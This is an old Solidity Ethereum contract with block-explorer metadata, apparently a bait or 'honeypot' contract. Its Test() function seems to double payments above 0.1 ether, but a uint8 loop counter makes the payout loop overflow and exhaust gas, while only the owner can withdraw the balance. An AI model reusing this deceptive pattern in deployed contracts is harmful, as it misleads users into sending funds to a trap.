
//Address: 0x2eCF8D1F46DD3C2098de9352683444A0B69Eb229
//Contract name: For_Test
//Balance: 0.1000344043345 Ether
//Verification Date: 2/14/2018
//Transacion Count: 2

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract For_Test
{
    address owner = msg.sender;
    
    function withdraw()
    payable
    public
    {
        require(msg.sender==owner);
        owner.transfer(this.balance);
    }
    
    function() payable {}
    
    function Test()
    payable
    public
    {
        if(msg.value> 0.1 ether)
        {
            uint256 multi =0;
            uint256 amountToTransfer=0;
             
            
            for(var i=0;i<msg.value*2;i++)
            {
                multi=i*2;
                
                if(multi<amountToTransfer)
                {
                  break;  
                }
                else
                {
                    amountToTransfer=multi;
                }
            }    
            msg.sender.transfer(amountToTransfer);
        }
    }
}
